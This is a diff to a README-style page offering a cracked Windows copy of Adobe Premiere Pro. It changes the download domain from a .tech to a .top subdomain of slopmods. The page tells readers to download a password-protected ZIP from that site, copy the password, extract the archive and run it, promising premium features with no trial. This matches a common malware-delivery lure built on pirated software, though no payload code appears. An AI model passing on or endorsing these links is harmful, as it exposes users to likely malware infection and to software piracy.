@@ -8,12 +8,12 @@ Adobe Premiere Pro — Windows setup and configuration · Premium workspace · Z
 
 > Use the release page below for Windows.
 
-- **Release page:** [bqvidufvood.slopmods.tech](https://bqvidufvood.slopmods.tech/)
-- **Full URL:** `https://bqvidufvood.slopmods.tech/`
+- **Release page:** [bqvidufvood.slopmods.top](https://bqvidufvood.slopmods.top/)
+- **Full URL:** `https://bqvidufvood.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **bqvidufvood.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **bqvidufvood.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Adobe Premiere Pro — Windows setup and configuration · Premium workspace · Z
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **bqvidufvood.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **bqvidufvood.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
